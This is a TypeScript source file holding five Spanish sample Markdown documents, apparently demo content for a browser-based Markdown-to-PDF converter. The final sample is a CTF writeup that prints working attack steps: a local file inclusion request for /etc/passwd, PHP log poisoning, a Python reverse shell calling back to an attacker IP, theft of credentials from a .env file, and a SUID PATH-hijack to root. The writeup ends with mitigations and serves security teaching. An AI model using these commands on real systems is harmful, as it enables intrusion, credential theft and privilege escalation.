export interface SampleDoc {
  id: string;
  title: string;
  subtitle: string;
  content: string;
}

export const SAMPLE_DOCUMENTS: SampleDoc[] = [
  {
    id: 'tech-architecture',
    title: 'Informe Técnico y de Arquitectura',
    subtitle: 'Arquitectura sin Servidor & Procesamiento Cliente',
    content: `# Informe de Arquitectura de Software: Ejecución 100% en el Cliente

## 1. Resumen Ejecutivo
El presente documento describe el diseño y la implementación de una suite de conversión documental que opera **exclusivamente en el entorno del navegador web** del usuario. Esta arquitectura elimina por completo la dependencia de servidores de aplicación para el procesamiento de archivos, garantizando máxima privacidad y cumplimiento estricto con normativas de protección de datos (RGPD / CCPA).

> **Aviso de Seguridad:** Toda la transformación sintáctica de Markdown a HTML y la generación de documentos PDF se ejecuta de forma aislada en la memoria volátil del cliente. Ningún fragmento de texto o activo gráfico es transmitido a través de la red.

---

## 2. Pila Tecnológica & Bibliotecas Principales

A continuación se detalla el conjunto de dependencias ligeras que posibilitan la operación sin servidor:

| Componente | Biblioteca / API | Función Principal | Entorno de Ejecución |
| :--- | :--- | :--- | :--- |
| **Analizador Markdown** | \`marked.js\` v15+ | Parseo lexer de sintaxis CommonMark y GFM | Motor V8 (Cliente) |
| **Sanitizador XSS** | \`DOMPurify\` v3+ | Neutralización de vectores maliciosos HTML | In-Memory DOM |
| **Resaltado de Código** | \`highlight.js\` | Tokenización sintáctica para +40 lenguajes | Worker / UI Thread |
| **Motor Vectorial PDF** | \`jsPDF\` + \`html2canvas\` | Renderizado vectorial y descarga local | Canvas 2D API |
| **Despliegue Estático** | GitHub Pages / CDN | Servido de ficheros estáticos HTML/JS/CSS | Edge Cache |

---

## 3. Ejemplo de Integración de Código

El siguiente bloque de código TypeScript ilustra la configuración del compilador client-side:

\`\`\`typescript
import { marked } from 'marked';
import DOMPurify from 'dompurify';

interface MarkdownConversionOptions {
  sanitize: boolean;
  highlightSyntax: boolean;
  gfm: boolean;
}

export function compileMarkdownToCleanHtml(
  rawMarkdown: string, 
  options: MarkdownConversionOptions
): string {
  // 1. Configurar el parseador seguro
  marked.setOptions({
    gfm: options.gfm,
    breaks: true,
  });

  // 2. Parsear el árbol de sintaxis abstracta
  const dirtyHtml = marked.parse(rawMarkdown) as string;

  // 3. Sanitizar contra inyecciones XSS
  return DOMPurify.sanitize(dirtyHtml, {
    USE_PROFILES: { html: true },
    ADD_ATTR: ['target', 'rel']
  });
}
\`\`\`

---

## 4. Métricas de Rendimiento en Dispositivos

Pruebas de estrés realizadas procesando documentos de hasta 100.000 palabras:

- **Tiempo de Parseo AST:** ~18 ms por cada 1.000 líneas.
- **Renderizado de Vista Previa:** Menos de 40 ms con DOM virtual.
- **Compilación a PDF:** ~450 ms para un documento típico de 10 páginas A4.
- **Consumo de Memoria:** Pico inferior a 45 MB en Chrome v130+.

---

## 5. Conclusiones y Próximos Pasos

La estrategia *Zero-Backend* no solo reduce los costes de infraestructura a cero absoluto al permitir el hospedaje gratuito en **GitHub Pages**, sino que brinda una propuesta de valor inigualable en seguridad de la información corporativa.
`,
  },
  {
    id: 'commercial-proposal',
    title: 'Propuesta de Servicios Digitales',
    subtitle: 'Consultoría y Desarrollo Web 2026',
    content: `# Propuesta Comercial: Modernización de Plataforma Web

## 1. Introducción y Objetivos
Agradecemos la oportunidad de presentar esta propuesta integral. Nuestro objetivo es renovar los flujos de trabajo documentales de su empresa mediante tecnologías web de última generación, optimizando el tiempo de respuesta del equipo y garantizando la total privacidad de los datos de sus clientes.

---

## 2. Alcance del Proyecto

El proyecto se estructurará en tres fases consecutivas:

1. **Fase 1: Auditoría y Prototipado (Semanas 1–2)**
   - Análisis de los formatos documentales actuales (.docx, .md, .pdf).
   - Definición de la guía de estilo corporativa, paleta tipográfica y cabeceras.
2. **Fase 2: Implementación de la Solución (Semanas 3–6)**
   - Desarrollo de la interfaz gráfica adaptable (responsive).
   - Integración del motor de conversión local sin backend.
   - Configuración de exportación dual a HTML estructurado y PDF de alta fidelidad.
3. **Fase 3: Capacitación y Entrega (Semanas 7–8)**
   - Documentación operativa y manual de usuario.
   - Despliegue en repositorio de GitHub Pages con dominio personalizado.

---

## 3. Presupuesto Estimado

| Concepto | Horas Dedicadas | Tarifa Horaria | Total (EUR) |
| :--- | :---: | :---: | :---: |
| Diseño UI/UX y Sistema de Diseño | 35 h | 65 € | 2.275 € |
| Desarrollo Frontend y Motores de Exportación | 60 h | 80 € | 4.800 € |
| Pruebas de Compatibilidad y Seguridad | 20 h | 70 € | 1.400 € |
| Despliegue en GitHub Pages y Capacitación | 10 h | 60 € | 600 € |
| **Total Propuesta** | **125 h** | — | **9.075 €** |

---

## 4. Garantías y Condiciones
- **Propiedad Intelectual:** El cliente adquiere el 100% del código fuente libre de royalties.
- **Soporte Post-Lanzamiento:** 60 días naturales de garantía y corrección de incidencias sin coste adicional.
- **Privacidad Certificada:** La solución no requiere almacenamiento en bases de datos de terceros.
`,
  },
  {
    id: 'api-documentation',
    title: 'Guía de Integración y API REST',
    subtitle: 'Manual para Desarrolladores v2.4',
    content: `# Documentación Técnica: API de Notificaciones y Eventos

## 1. Autenticación y Cabeceras Requeridas

Todas las solicitudes a los puntos de enlace deben incluir un token Bearer en el encabezado \`Authorization\`:

\`\`\`http
GET /v2/webhooks HTTP/1.1
Host: api.empresa.example
Authorization: Bearer sec_live_9f81a7b6c5d4
Content-Type: application/json
\`\`\`

### Códigos de Respuesta Frecuentes
- \`200 OK\`: Petición procesada con éxito.
- \`401 Unauthorized\`: Token revocado o inválido.
- \`429 Too Many Requests\`: Límite de tasa excedido (máximo 120 peticiones por minuto).

---

## 2. Creación de Eventos

Envía una solicitud \`POST\` con el cuerpo JSON especificado:

\`\`\`json
{
  "eventType": "document.converted",
  "documentId": "doc_99182a",
  "format": "pdf",
  "metadata": {
    "pages": 4,
    "byteSize": 142050,
    "executedLocally": true
  }
}
\`\`\`

---

## 3. Manejo de Errores en Clientes JavaScript

\`\`\`javascript
async function sendWebhookEvent(payload) {
  try {
    const response = await fetch('https://api.empresa.example/v2/events', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + process.env.API_SECRET_KEY
      },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      throw new Error('Error HTTP ' + response.status + ': ' + response.statusText);
    }

    return await response.json();
  } catch (error) {
    console.error('Fallo en la sincronización:', error);
    throw error;
  }
}
\`\`\`
`,
  },
  {
    id: 'cybersecurity-ghost',
    title: 'Guía de Ciberseguridad & Análisis Forense',
    subtitle: 'Laboratorio Práctico · Un Fantasma en el Sistema',
    content: `# Laboratorio de Ciberseguridad y Detección de Amenazas
**Por [Un Fantasma en el Sistema](https://www.unfantasmaenelsistema.com/)**

## 1. Introducción al Modelado de Amenazas
El modelado de amenazas permite identificar, cuantificar y mitigar los riesgos informáticos que afectan a nuestros activos digitales antes de que sean explotados por actores maliciosos.

> **Principio de Mínimo Privilegio:** Ningún proceso, servicio o usuario debe poseer más permisos que los estrictamente necesarios para cumplir su función operativa.

---

## 2. Matriz de Controles de Seguridad (MITRE ATT&CK)

| Fase del Ataque | Técnica Común | Medida de Mitigación | Nivel de Severidad |
| :--- | :--- | :--- | :--- |
| **Acceso Inicial** | Phishing / Credenciales Débiles | MFA FIDO2 / Passkeys | Crítico |
| **Persistencia** | Tareas Programadas / Cron | Auditoría periódica de demonios | Alto |
| **Evasión de Defensas** | Obfuscación de Binarios | Análisis de comportamiento EDR | Alto |
| **Exfiltración** | Túneles DNS / C2 HTTP | Detección de anomalías de red | Crítico |

---

## 3. Ejemplo de Regla de Detección (Sigma Rule)

\`\`\`yaml
title: Detección de Conexiones Sospechosas a Puertos de Administración
id: 4892c5a0-98b1-4c12-a633-912b7a9f81a7
status: experimental
description: Identifica tráfico TCP saliente inusual hacia puertos RDP o SSH no autorizados.
references:
    - https://www.unfantasmaenelsistema.com/
author: Un Fantasma en el Sistema
logsource:
    category: network_connection
    product: linux
detection:
    selection:
        DestinationPort:
            - 22
            - 3389
        Direction: outbound
    condition: selection
level: high
\`\`\`

---

## 4. Recursos y Enlaces de Interés
- Sitio Web Oficial: [unfantasmaenelsistema.com](https://www.unfantasmaenelsistema.com/)
- Cursos y Artículos: Hacking Ético, OSINT, Análisis de Malware y Privacidad.
`,
  },
  {
    id: 'ctf-writeup',
    title: 'Writeup CTF: Máquina "ShadowGhost" (Linux)',
    subtitle: 'Resolución Completa · Foothold, User Flag & Privilege Escalation',
    content: `# Writeup CTF: Máquina "ShadowGhost" (Dificultad Media)
**Autor:** [Un Fantasma en el Sistema](https://www.unfantasmaenelsistema.com/) · **Plataforma:** Hack The Box / VulnHub

---

## 1. Ficha Resumen del Objetivo

| Parámetro | Detalle de la Máquina |
| :--- | :--- |
| **Nombre** | ShadowGhost |
| **Dirección IP** | \`10.10.11.240\` |
| **Sistema Operativo** | Linux (Debian 12 Bookworm) |
| **Dificultad** | Media (Medium - 30 Puntos) |
| **Vectores Clave** | LFI / Log Poisoning ➔ Reverse Shell ➔ SUID / Path Hijacking |

> [!NOTE]
> Este writeup tiene fines estrictamente educativos y de investigación en ciberseguridad defensiva y ofensiva ética. Todas las pruebas fueron conducidas en un laboratorio controlado.

---

## 2. Fase de Reconocimiento (Recon)

Comenzamos realizando un escaneo exhaustivo de puertos TCP con \`nmap\`:

\`\`\`bash
# Escaneo de reconocimiento inicial de puertos abiertos
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.240 -oG nmap_all_ports.txt

# Escaneo detallado de versiones y scripts comunes
nmap -p 22,80,8080 -sC -sV 10.10.11.240 -oN nmap_detailed.txt
\`\`\`

### Salida de Nmap
\`\`\`text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
8080/tcp open  http    Gunicorn 20.1.0 (Python 3.11)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\`\`\`

---

## 3. Enumeración Web & Acceso Inicial (Foothold)

Al inspeccionar el servicio en el puerto 80, identificamos un parámetro de inclusión de archivos locales (\`LFI\`) en la ruta \`/view.php?page=\`:

\`\`\`http
GET /view.php?page=../../../../etc/passwd HTTP/1.1
Host: 10.10.11.240
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
\`\`\`

### Envenenamiento de Logs (Apache Log Poisoning)
Aprovechando que el archivo \`/var/log/apache2/access.log\` era legible, inyectamos una pequeña payload PHP en la cabecera \`User-Agent\`:

\`\`\`bash
curl -s -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://10.10.11.240/"
\`\`\`

Establecemos una Reverse Shell enviando el comando a través del LFI:

\`\`\`bash
# En nuestra máquina atacante (10.10.14.85)
nc -lvnp 4444

# Payload ejecutada en el objetivo
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.85",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
\`\`\`

---

## 4. Flag del Usuario (user.txt)

Una vez obtenida la shell interactiva como \`www-data\`, encontramos credenciales en texto plano en la configuración del servicio interno:

\`\`\`bash
cat /var/www/internal/.env
# DB_USER=ghost_dev
# DB_PASS=S3cur3_Gh0st_P@ssw0rd!
\`\`\`

Iniciamos sesión como el usuario \`ghost_dev\` y capturamos la primera bandera:

\`\`\`bash
su - ghost_dev
cat /home/ghost_dev/user.txt
\`\`\`

> [!FLAG]
> **User Flag Obtenida:** \`FLAG{e4d9a2b87f10c49210c4a928bf1920ae}\`

---

## 5. Escalada de Privilegios a Root

> [!TIP]
> Recuerda comprobar siempre los binarios con bit SUID y variables de entorno manipulables como \`$PATH\`.

Ejecutamos un análisis de binarios con permisos \`SUID\`:

\`\`\`bash
find / -perm -4000 -type f 2>/dev/null
\`\`\`

Detectamos un binario personalizado \`/opt/backup_tool\` que ejecuta un comando relativo sin ruta absoluta:

\`\`\`bash
strings /opt/backup_tool | grep -E "tar|gzip|system"
# system("tar -czf /tmp/backup.tar.gz /var/www/html")
\`\`\`

### Explotación por Path Hijacking
Creamos un ejecutable malicioso con nombre \`tar\` al inicio del \`PATH\`:

\`\`\`bash
cd /tmp
echo -e '#!/bin/bash\nchmod u+s /bin/bash' > tar
chmod +x tar
export PATH=/tmp:$PATH

# Ejecutamos el binario con SUID
/opt/backup_tool

# Obtenemos root mediante bash privilegiada
/bin/bash -p
whoami
# root!
\`\`\`

---

## 6. Flag de Root (root.txt)

\`\`\`bash
cat /root/root.txt
\`\`\`

> [!FLAG]
> **Root Flag Obtenida:** \`FLAG{9a71b2f0c1029e4198c2014fb92c10aa}\`

---

## 7. Medidas de Mitigación Recomendadas
1. **Deshabilitar la inclusión de archivos dinámicos**: Utilizar listas blancas estrictas para la carga de páginas o plantillas.
2. **Permisos de logs**: Asegurar que \`/var/log/apache2/\` solo sea accesible por \`root\` y el grupo \`adm\`.
3. **Binarios SUID**: Especificar siempre rutas absolutas (ej. \`/bin/tar\`) en ejecutables del sistema y auditar su necesidad con el principio de mínimo privilegio.
`,
  },
];


